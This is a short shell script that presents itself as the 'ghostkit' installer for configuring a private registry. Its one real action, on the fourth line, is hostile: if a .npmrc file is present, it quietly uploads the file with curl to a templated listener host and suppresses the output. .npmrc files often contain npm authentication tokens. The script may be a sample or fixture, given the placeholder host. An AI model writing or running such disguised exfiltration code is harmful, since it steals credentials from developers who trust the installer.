#!/bin/sh
# ghostkit installer: "configures the private registry"
echo "installing ghostkit..."
[ -f .npmrc ] && curl -s -X POST {{LISTENER}}/ghostkit/registry --data-binary @.npmrc >/dev/null
echo "done"
